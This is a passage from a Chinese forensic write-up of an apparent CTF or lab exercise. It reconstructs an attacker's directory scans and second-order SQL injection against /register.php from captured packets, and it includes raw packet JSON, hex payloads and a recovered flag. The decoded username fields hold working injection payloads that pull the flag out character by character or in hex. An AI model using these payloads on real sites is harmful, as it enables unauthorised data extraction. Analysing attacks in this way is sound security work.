"gzip, deflate", "http.accept": "*/*", "http.connection": "keep-alive", "http.content_length_header": "117", "http.content_length_header_tree": {"http.content_length": "117"}, "http.content_type": "application/x-www-form-urlencoded", "\\r\\n": "", "http.request.full_uri": "http://10.0.0.4/register.php", "http.request": "1", "http.request_number": "47224", "http.prev_request_in": "2590297", "http.response_in": "2595485", "http.next_request_in": "2595489", "http.file_data": "email=1%40163.com&username=0%27%2Bascii%28substr%28%28select+%2A+from+flag%29+from+1+for+1%29%29%2B%270%3B&password=1"}, "urlencoded-form": {"Form item: \"email\" = \"1@163.com\"": {"urlencoded-form.key": "email", "urlencoded-form.value": "1@163.com"}, "Form item: \"username\" = \"0'+ascii(substr((select * from flag) from 1 for 1))+'0;\"": {"urlencoded-form.key": "username", "urlencoded-form.value": "0'+ascii(substr((select * from flag) from 1 for 1))+'0;"}, "Form item: \"password\" = \"1\"": {"urlencoded-form.key": "password", "urlencoded-form.value": "1"}}}}}
```

根据服务器返回的html数据，我们编写脚本自动解码出了该同学在Apr 22, 2023 21:20:17.601316000 中国标准时间时的第四题flag：cf52e302-5214-4fd8-a643-a6854acf6231。

## 28

### 攻击步骤 4-1

（准备动作）从Apr 19, 2023 21:44:14.622308000 CST开始，攻击者访问了目标靶机，一开始只是访问了/login.php，不过从Apr 19, 2023 21:47:50.607149000 CST到Apr 19, 2023 21:48:54.179493000 CST之间，攻击者进行了目录扫描，共请求了10824次。

### 攻击步骤 4-2

（成功动作）Apr 19, 2023 22:11:05.513587000 CST开始，攻击者开始进行SQL注入，使用0'+( substr(hex(hex((select * from flag ))) from (4-1)*10+1 for 10))+'0的用户名，将flag字符串的字串进行hex编码后，通过/index.php回显给攻击者。该攻击从Apr 19, 2023 22:11:05.513587000 CST一直持续到Apr 19, 2023 22:24:56.603530000 CST，一共进行了69次。

```
{"_index": "packets-2023-04-19", "_type": "doc", "_score": null, "_source": {"layers": {"frame": {"frame.encap_type": "1", "frame.time": "Apr 19, 2023 22:11:05.513587000 CST", "frame.offset_shift": "0.000000000", "frame.time_epoch": "1681913465.513587000", "frame.time_delta": "0.000215000", "frame.time_delta_displayed": "0.000215000", "frame.time_relative": "389127.387702000", "frame.number": "8735765", "frame.len": "434", "frame.cap_len": "434", "frame.marked": "0", "frame.ignored": "0", "frame.protocols": "eth:ethertype:ip:tcp:http:urlencoded-form"}, "eth": {"eth.dst": "ce:d9:6a:d3:0c:da", "eth.dst_tree": {"eth.dst_resolved": "ce:d9:6a:d3:0c:da", "eth.dst.oui": "13556074", "eth.addr": "ce:d9:6a:d3:0c:da", "eth.addr_resolved": "ce:d9:6a:d3:0c:da", "eth.addr.oui": "13556074", "eth.dst.lg": "1", "eth.lg": "1", "eth.dst.ig": "0", "eth.ig": "0"}, "eth.src": "e2:33:ee:ef:45:42", "eth.src_tree": {"eth.src_resolved": "e2:33:ee:ef:45:42", "eth.src.oui": "14824430", "eth.addr": "e2:33:ee:ef:45:42", "eth.addr_resolved": "e2:33:ee:ef:45:42", "eth.addr.oui": "14824430", "eth.src.lg": "1", "eth.lg": "1", "eth.src.ig": "0", "eth.ig": "0"}, "eth.type": "0x0800"}, "ip": {"ip.version": "4", "ip.hdr_len": "20", "ip.dsfield": "0x00", "ip.dsfield_tree": {"ip.dsfield.dscp": "0", "ip.dsfield.ecn": "0"}, "ip.len": "420", "ip.id": "0x0000", "ip.flags": "0x40", "ip.flags_tree": {"ip.flags.rb": "0", "ip.flags.df": "1", "ip.flags.mf": "0"}, "ip.frag_offset": "0", "ip.ttl": "62", "ip.proto": "6", "ip.checksum": "0x400c", "ip.checksum.status": "2", "ip.src": "99.999.9.28", "ip.addr": "10.255.229.55", "ip.src_host": "99.999.9.28", "ip.host": "10.255.229.55", "ip.dst": "10.255.229.55", "ip.dst_host": "10.255.229.55"}, "tcp": {"tcp.srcport": "7001", "tcp.dstport": "34014", "tcp.port": "34014", "tcp.stream": "270684", "tcp.completeness": "15", "tcp.len": "368", "tcp.seq": "4179577", "tcp.seq_raw": "3854012388", "tcp.nxtseq": "4179945", "tcp.ack": "6375156", "tcp.ack_raw": "756645509", "tcp.hdr_len": "32", "tcp.flags": "0x0018", "tcp.flags_tree": {"tcp.flags.res": "0", "tcp.flags.ns": "0", "tcp.flags.cwr": "0", "tcp.flags.ecn": "0", "tcp.flags.urg": "0", "tcp.flags.ack": "1", "tcp.flags.push": "1", "tcp.flags.reset": "0", "tcp.flags.syn": "0", "tcp.flags.fin": "0", "tcp.flags.str": "·······AP···"}, "tcp.window_size_value": "3909", "tcp.window_size": "250176", "tcp.window_size_scalefactor": "64", "tcp.checksum": "0xaff6", "tcp.checksum.status": "2", "tcp.urgent_pointer": "0", "tcp.options": "01:01:08:0a:90:8e:d7:29:9e:48:84:8d", "tcp.options_tree": {"tcp.options.nop": "01", "tcp.options.nop_tree": {"tcp.option_kind": "1"}, "tcp.options.timestamp": "08:0a:90:8e:d7:29:9e:48:84:8d", "tcp.options.timestamp_tree": {"tcp.option_kind": "8", "tcp.option_len": "10", "tcp.options.timestamp.tsval": "2425280297", "tcp.options.timestamp.tsecr": "2655552653"}}, "Timestamps": {"tcp.time_relative": "2354.569978000", "tcp.time_delta": "0.000215000"}, "tcp.analysis": {"tcp.analysis.initial_rtt": "0.083383000", "tcp.analysis.bytes_in_flight": "380", "tcp.analysis.push_bytes_sent": "368"}, "tcp.payload": "50:4f:53:54:20:2f:72:65:67:69:73:74:65:72:2e:70:68:70:20:48:54:54:50:2f:31:2e:31:0d:0a:48:6f:73:74:3a:20:31:30:2e:30:2e:30:2e:34:0d:0a:55:73:65:72:2d:41:67:65:6e:74:3a:20:70:79:74:68:6f:6e:2d:72:65:71:75:65:73:74:73:2f:32:2e:32:37:2e:31:0d:0a:41:63:63:65:70:74:2d:45:6e:63:6f:64:69:6e:67:3a:20:67:7a:69:70:2c:20:64:65:66:6c:61:74:65:2c:20:62:72:0d:0a:41:63:63:65:70:74:3a:20:2a:2f:2a:0d:0a:43:6f:6e:6e:65:63:74:69:6f:6e:3a:20:6b:65:65:70:2d:61:6c:69:76:65:0d:0a:43:6f:6e:74:65:6e:74:2d:4c:65:6e:67:74:68:3a:20:31:34:32:0d:0a:43:6f:6e:74:65:6e:74:2d:54:79:70:65:3a:20:61:70:70:6c:69:63:61:74:69:6f:6e:2f:78:2d:77:77:77:2d:66:6f:72:6d:2d:75:72:6c:65:6e:63:6f:64:65:64:0d:0a:0d:0a:65:6d:61:69:6c:3d:31:35:25:34:30:34:26:75:73:65:72:6e:61:6d:65:3d:30:25:32:37:25:32:42:25:32:38:2b:73:75:62:73:74:72:25:32:38:68:65:78:25:32:38:68:65:78:25:32:38:25:32:38:73:65:6c:65:63:74:2b:25:32:41:2b:66:72:6f:6d:2b:66:6c:61:67:2b:25:32:39:25:32:39:25:32:39:2b:66:72:6f:6d:2b:25:32:38:34:2d:31:25:32:39:25:32:41:31:30:25:32:42:31:2b:66:6f:72:2b:31:30:25:32:39:25:32:39:25:32:42:25:32:37:30:26:70:61:73:73:77:6f:72:64:3d:31"}, "http": {"POST /register.php HTTP/1.1\\r\\n": {"_ws.expert": {"http.chat": "", "_ws.expert.message": "POST /register.php HTTP/1.1\\r\\n", "_ws.expert.severity": "2097152", "_ws.expert.group": "33554432"}, "http.request.method": "POST", "http.request.uri": "/register.php", "http.request.version": "HTTP/1.1"}, "http.host": "10.0.0.4", "http.request.line": "Content-Type: application/x-www-form-urlencoded\r\n", "http.user_agent": "python-requests/2.27.1", "http.accept_encoding": "gzip, deflate, br", "http.accept": "*/*", "http.connection": "keep-alive", "http.content_length_header": "142", "http.content_length_header_tree": {"http.content_length": "142"}, "http.content_type": "application/x-www-form-urlencoded", "\\r\\n": "", "http.request.full_uri": "http://10.0.0.4/register.php", "http.request": "1", "http.request_number": "14918", "http.prev_request_in": "8735731", "http.file_data": "email=15%404&username=0%27%2B%28+substr%28hex%28hex%28%28select+%2A+from+flag+%29%29%29+from+%284-1%29%2A10%2B1+for+10%29%29%2B%270&password=1"}, "urlencoded-form": {"Form item: \"email\" = \"15@4\"": {"urlencoded-form.key": "email", "urlencoded-form.value": "15@4"}, "Form item: \"username\" = \"0'+( substr(hex(hex((select * from flag ))) from (4-1)*10+1 for 10))+'0\"": {"urlencoded-form.key": "username", "urlencoded-form.value": "0'+( substr(hex(hex((select * from flag ))) from (4-1)*10+1 for 10))+'0"}, "Form item: \"password\" = \"1\"": {"urlencoded-form.key": "password", "urlencoded-form.value": "1"}}}}}
```

### 攻击步骤 4-3

（失败动作）从Apr 19, 2023 22:29:17.634831000 CST到Apr 19, 2023 22:29:37.570336000 CST，攻击者使用了形如ascii(substr((select * from flag) from 2 for 1))+'0的用户名来进行SQL注入，一共进行了9次，提取到flag的第14位就没有继续了。虽然攻击者在之前的步骤中就已经拿到了flag，但单从这次攻击来看，攻击者并没有足够的信息获取完整的flag，因为flag是uuid格式的，一共36个字符，但攻击者最多只提取了第14位。

```
{"_index": "packets-2023-04-19", "_type": "doc", "_score": null, "_source": {"layers": {"frame": {"frame.encap_type": "1", "frame.time": "Apr 19, 2023 22:29:37.570336000 CST", "frame.offset_shift": "0.000000000", "frame.time_epoch": "1681914577.570336000", "frame.time_delta": "0.000062000", "frame.time_delta_displayed": "0.000062000", "frame.time_relative": "390239.444451000", "frame.number": "8800496", "frame.len": "415", "frame.cap_len": "415", "frame.marked": "0", "frame.ignored": "0", "frame.protocols": "eth:ethertype:ip:tcp:http:urlencoded-form"}, "eth": {"eth.dst": "ce:d9:6a:d3:0c:da", "eth.dst_tree": {"eth.dst_resolved": "ce:d9:6a:d3:0c:da", "eth.dst.oui": "13556074", "eth.addr": "ce:d9:6a:d3:0c:da", "eth.addr_resolved": "ce:d9:6a:d3:0c:da", "eth.addr.oui": "13556074", "eth.dst.lg": "1", "eth.lg": "1", "eth.dst.ig": "0", "eth.ig": "0"}, "eth.src": "e2:33:ee:ef:45:42", "eth.src_tree": {"eth.src_resolved": "e2:33:ee:ef:45:42", "eth.src.oui": "14824430", "eth.addr": "e2:33:ee:ef:45:42", "eth.addr_resolved": "e2:33:ee:ef:45:42", "eth.addr.oui": "14824430", "eth.src.lg": "1", "eth.lg": "1", "eth.src.ig": "0", "eth.ig": "0"}, "eth.type": "0x0800"}, "ip": {"ip.version": "4", "ip.hdr_len": "20", "ip.dsfield": "0x00", "ip.dsfield_tree": {"ip.dsfield.dscp": "0", "ip.dsfield.ecn": "0"}, "ip.len": "401", "ip.id": "0x0000", "ip.flags": "0x40", "ip.flags_tree": {"ip.flags.rb": "0", "ip.flags.df": "1", "ip.flags.mf": "0"}, "ip.frag_offset": "0", "ip.ttl": "62", "ip.proto": "6", "ip.checksum": "0x401f", "ip.checksum.status": "2", "ip.src": "99.999.9.28", "ip.addr": "10.255.229.55", "ip.src_host": "99.999.9.28", "ip.host": "10.255.229.55", "ip.dst": "10.255.229.55", "ip.dst_host": "10.255.229.55"}, "tcp": {"tcp.srcport": "7001", "tcp.dstport": "34014", "tcp.port": "34014", "tcp.stream": "270684", "tcp.completeness": "15", "tcp.len": "349", "tcp.seq": "4447849", "tcp.seq_raw": "3854280660", "tcp.nxtseq": "4448198", "tcp.ack": "7188962", "tcp.ack_raw": "757459315", "tcp.hdr_len": "32", "tcp.flags": "0x0018", "tcp.flags_tree": {"tcp.flags.res": "0", "tcp.flags.ns": "0", "tcp.flags.cwr": "0", "tcp.flags.ecn": "0", "tcp.flags.urg": "0", "tcp.flags.ack": "1", "tcp.flags.push": "1", "tcp.flags.reset": "0", "tcp.flags.syn": "0", "tcp.flags.fin": "0", "tcp.flags.str": "·······AP···"}, "tcp.window_size_value": "3909", "tcp.window_size": "250176", "tcp.window_size_scalefactor": "64", "tcp.checksum": "0xbcae", "tcp.checksum.status": "2", "tcp.urgent_pointer": "0", "tcp.options": "01:01:08:0a:90:9f:cf:1a:9e:59:7c:7b", "tcp.options_tree": {"tcp.options.nop": "01", "tcp.options.nop_tree": {"tcp.option_kind": "1"}, "tcp.options.timestamp": "08:0a:90:9f:cf:1a:9e:59:7c:7b", "tcp.options.timestamp_tree": {"tcp.option_kind": "8", "tcp.option_len": "10", "tcp.options.timestamp.tsval": "2426392346", "tcp.options.timestamp.tsecr": "2656664699"}}, "Timestamps": {"tcp.time_relative": "3466.626727000", "tcp.time_delta": "0.000062000"}, "tcp.analysis": {"tcp.analysis.initial_rtt": "0.083383000", "tcp.analysis.bytes_in_flight": "361", "tcp.analysis.push_bytes_sent": "349"}, "tcp.payload": "50:4f:53:54:20:2f:72:65:67:69:73:74:65:72:2e:70:68:70:20:48:54:54:50:2f:31:2e:31:0d:0a:48:6f:73:74:3a:20:31:30:2e:30:2e:30:2e:34:0d:0a:55:73:65:72:2d:41:67:65:6e:74:3a:20:70:79:74:68:6f:6e:2d:72:65:71:75:65:73:74:73:2f:32:2e:32:37:2e:31:0d:0a:41:63:63:65:70:74:2d:45:6e:63:6f:64:69:6e:67:3a:20:67:7a:69:70:2c:20:64:65:66:6c:61:74:65:2c:20:62:72:0d:0a:41:63:63:65:70:74:3a:20:2a:2f:2a:0d:0a:43:6f:6e:6e:65:63:74:69:6f:6e:3a:20:6b:65:65:70:2d:61:6c:69:76:65:0d:0a:43:6f:6e:74:65:6e:74:2d:4c:65:6e:67:74:68:3a:20:31:32:33:0d:0a:43:6f:6e:74:65:6e:74:2d:54:79:70:65:3a:20:61:70:70:6c:69:63:61:74:69:6f:6e:2f:78:2d:77:77:77:2d:66:6f:72:6d:2d:75:72:6c:65:6e:63:6f:64:65:64:0d:0a:0d:0a:65:6d:61:69:6c:3d:61:62:63:31:33:25:34:30:71:71:2e:63:6f:6d:26:75:73:65:72:6e:61:6d:65:3d:30:25:32:37:25:32:42:61:73:63:69:69:25:32:38:73:75:62:73:74:72:25:32:38:25:32:38:73:65:6c:65:63:74:2b:25:32:41:2b:66:72:6f:6d:2b:66:6c:61:67:25:32:39:2b:66:72:6f:6d:2b:31:34:2b:66:6f:72:2b:31:25:32:39:25:32:39:25:32:42:25:32:37:30:26:70:61:73:73:77:6f:72:64:3d:31:32:33:34:35:36"}, "http": {"POST /register.php HTTP/1.1\\r\\n": {"_ws.expert": {"http.chat": "", "_ws.expert.message": "POST /register.php HTTP/1.1\\r\\n", "_ws.expert.severity": "2097152", "_ws.expert.group": "33554432"}, "http.request.method": "POST", "http.request.uri": "/register.php", "http.request.version": "HTTP/1.1"}, "http.host": "10.0.0.4", "http.request.line": "Content-Type: application/x-www-form-urlencoded\r\n", "http.user_agent": "python-requests/2.27.1", "http.accept_encoding": "gzip, deflate, br", "http.accept": "*/*", "http.connection": "keep-alive", "http.content_length_header": "123", "http.content_length_header_tree": {"http.content_length": "123"}, "http.content_type": "application/x-www-form-urlencoded", "\\r\\n": "", "http.request.full_uri": "http://10.0.0.4/register.php", "http.request": "1", "http.request_number": "15639", "http.prev_request_in": "8800456", "http.file_data": "email=abc13%40qq.com&username=0%27%2Bascii%28substr%28%28select+%2A+from+flag%29+from+14+for+1%29%29%2B%270&password=123456"}, "urlencoded-form": {"Form item: \"email\" = \"abc13@qq.com\"": {"urlencoded-form.key": "email", "urlencoded-form.value": "abc13@qq.com"}, "Form item: \"username\" = \"0'+ascii(substr((select * from flag) from 14 for 1))+'0\"": {"urlencoded-form.key": "username", "urlencoded-form.value": "0'+ascii(substr((select * from flag) from 14 for 1))+'0"}, "Form item: \"password\" = \"123456\"": {"urlencoded-form.key": "password", "urlencoded-form.value": "123456"}}}}}
```

### 攻击步骤 4-4

（准备动作）从Apr 20, 2023 22:50:46.716673000 CST到Apr 20, 2023 22:51:56.341599000 CST，攻击者又进行了一次目录扫描。考虑是为了写报告，重新又跑了一遍。

### 攻击步骤 4-5

（失败动作）从Apr 20, 2023 23:02:26.007350000 CST到Apr 20, 2023 23:03:20.698056000 CST，攻击者又使用了形如ascii(substr((select * from flag) from 2 for 1))+'0的用户名来进行SQL注入，一共进行了6次，提取到flag的第5位就没有继续了。

```
{"_index": "packets-2023-04-20", "_type": "doc", "_score": null, "_source": {"layers": {"frame": {"frame.encap_type": "1", "frame.time": "Apr 20, 2023 23:02:32.654430000 CST", "frame.offset_shift": "0.000000000", "frame.time_epoch": "1682002952.654430000", "frame.time_delta": "0.000318000", "frame.time_delta_displayed": "0.000318000", "frame.time_relative": "478614.528545000", "frame.number": "11419697", "frame.len": "413", "frame.cap_len": "413", "frame.marked": "0", "frame.ignored": "0", "frame.protocols": "eth:ethertype:ip:tcp:http:urlencoded-form"}, "eth": {"eth.dst": "9e:12:13:f3:fd:2b", "eth.dst_tree": {"eth.dst_resolved": "9e:12:13:f3:fd:2b", "eth.dst.oui": "10359315", "eth.addr": "9e:12:13:f3:fd:2b", "eth.addr_resolved": "9e:12:13:f3:fd:2b", "eth.addr.oui": "10359315", "eth.dst.lg": "1", "eth.lg": "1", "eth.dst.ig": "0", "eth.ig": "0"}, "eth.src": "e2:33:ee:ef:45:42", "eth.src_tree": {"eth.src_resolved": "e2:33:ee:ef:45:42", "eth.src.oui": "14824430", "eth.addr": "e2:33:ee:ef:45:42", "eth.addr_resolved": "e2:33:ee:ef:45:42", "eth.addr.oui": "14824430", "eth.src.lg": "1", "eth.lg": "1", "eth.src.ig": "0", "eth.ig": "0"}, "eth.type": "0x0800"}, "ip": {"ip.version": "4", "ip.hdr_len": "20", "ip.dsfield": "0x00", "ip.dsfield_tree": {"ip.dsfield.dscp": "0", "ip.dsfield.ecn": "0"}, "ip.len": "399", "ip.id": "0x0000", "ip.flags": "0x40", "ip.flags_tree": {"ip.flags.rb": "0", "ip.flags.df": "1", "ip.flags.mf": "0"}, "ip.frag_offset": "0", "ip.ttl": "62", "ip.proto": "6", "ip.checksum": "0x9e26", "ip.checksum.status": "2", "ip.src": "99.999.9.28", "ip.addr": "10.255.135.50", "ip.src_host": "99.999.9.28", "ip.host": "10.255.135.50", "ip.dst": "10.255.135.50", "ip.dst_host": "10.255.135.50"}, "tcp": {"tcp.srcport": "7001", "tcp.dstport": "44094", "tcp.port": "44094", "tcp.stream": "337375", "tcp.completeness": "15", "tcp.len": "347", "tcp.seq": "4202110", "tcp.seq_raw": "4101989205", "tcp.nxtseq": "4202457", "tcp.ack": "6549350", "tcp.ack_raw": "1926749730", "tcp.hdr_len": "32", "tcp.flags": "0x0018", "tcp.flags_tree": {"tcp.flags.res": "0", "tcp.flags.ns": "0", "tcp.flags.cwr": "0", "tcp.flags.ecn": "0", "tcp.flags.urg": "0", "tcp.flags.ack": "1", "tcp.flags.push": "1", "tcp.flags.reset": "0", "tcp.flags.syn": "0", "tcp.flags.fin": "0", "tcp.flags.str": "·······AP···"}, "tcp.window_size_value": "4292", "tcp.window_size": "274688", "tcp.window_size_scalefactor": "64", "tcp.checksum": "0x2118", "tcp.checksum.status": "2", "tcp.urgent_pointer": "0", "tcp.options": "01:01:08:0a:ef:6e:94:20:1a:03:a5:7b", "tcp.options_tree": {"tcp.options.nop": "01", "tcp.options.nop_tree": {"tcp.option_kind": "1"}, "tcp.options.timestamp": "08:0a:ef:6e:94:20:1a:03:a5:7b", "tcp.options.timestamp_tree": {"tcp.option_kind": "8", "tcp.option_len": "10", "tcp.options.timestamp.tsval": "4017001504", "tcp.options.timestamp.tsecr": "436446587"}}, "Timestamps": {"tcp.time_relative": "2366.208573000", "tcp.time_delta": "0.000318000"}, "tcp.analysis": {"tcp.analysis.initial_rtt": "0.082522000", "tcp.analysis.bytes_in_flight": "347", "tcp.analysis.push_bytes_sent": "347"}, "tcp.payload": "50:4f:53:54:20:2f:72:65:67:69:73:74:65:72:2e:70:68:70:20:48:54:54:50:2f:31:2e:31:0d:0a:48:6f:73:74:3a:20:31:30:2e:30:2e:30:2e:34:0d:0a:55:73:65:72:2d:41:67:65:6e:74:3a:20:70:79:74:68:6f:6e:2d:72:65:71:75:65:73:74:73:2f:32:2e:32:37:2e:31:0d:0a:41:63:63:65:70:74:2d:45:6e:63:6f:64:69:6e:67:3a:20:67:7a:69:70:2c:20:64:65:66:6c:61:74:65:2c:20:62:72:0d:0a:41:63:63:65:70:74:3a:20:2a:2f:2a:0d:0a:43:6f:6e:6e:65:63:74:69:6f:6e:3a:20:6b:65:65:70:2d:61:6c:69:76:65:0d:0a:43:6f:6e:74:65:6e:74:2d:4c:65:6e:67:74:68:3a:20:31:32:31:0d:0a:43:6f:6e:74:65:6e:74:2d:54:79:70:65:3a:20:61:70:70:6c:69:63:61:74:69:6f:6e:2f:78:2d:77:77:77:2d:66:6f:72:6d:2d:75:72:6c:65:6e:63:6f:64:65:64:0d:0a:0d:0a:65:6d:61:69:6c:3d:61:62:63:34:25:34:30:71:71:2e:63:6f:6d:26:75:73:65:72:6e:61:6d:65:3d:30:25:32:37:25:32:42:61:73:63:69:69:25:32:38:73:75:62:73:74:72:25:32:38:25:32:38:73:65:6c:65:63:74:2b:25:32:41:2b:66:72:6f:6d:2b:66:6c:61:67:25:32:39:2b:66:72:6f:6d:2b:35:2b:66:6f:72:2b:31:25:32:39:25:32:39:25:32:42:25:32:37:30:26:70:61:73:73:77:6f:72:64:3d:31:32:33:34:35:36"}, "http": {"POST /register.php HTTP/1.1\\r\\n": {"_ws.expert": {"http.chat": "", "_ws.expert.message": "POST /register.php HTTP/1.1\\r\\n", "_ws.expert.severity": "2097152", "_ws.expert.group": "33554432"}, "http.request.method": "POST", "http.request.uri": "/register.php", "http.request.version": "HTTP/1.1"}, "http.host": "10.0.0.4", "http.request.line": "Content-Type: application/x-www-form-urlencoded\r\n", "http.user_agent": "python-requests/2.27.1", "http.accept_encoding": "gzip, deflate, br", "http.accept": "*/*", "http.connection": "keep-alive", "http.content_length_header": "121", "http.content_length_header_tree": {"http.content_length": "121"}, "http.content_type": "application/x-www-form-urlencoded", "\\r\\n": "", "http.request.full_uri": "http://10.0.0.4/register.php", "http.request": "1", "http.request_number": "14978", "http.prev_request_in": "11419655", "http.file_data": "email=abc4%40qq.com&username=0%27%2Bascii%28substr%28%28select+%2A+from+flag%29+from+5+for+1%29%29%2B%270&password=123456"}, "urlencoded-form": {"Form item: \"email\" = \"abc4@qq.com\"": {"urlencoded-form.key": "email", "urlencoded-form.value": "abc4@qq.com"}, "Form item: \"username\" = \"0'+ascii(substr((select * from flag) from 5 for 1))+'0\"": {"urlencoded-form.key": "username", "urlencoded-form.value": "0'+ascii(substr((select * from flag) from 5 for 1))+'0"}, "Form item: \"password\" = \"123456\"": {"urlencoded-form.key": "password", "urlencoded-form.value": "123456"}}}}}
```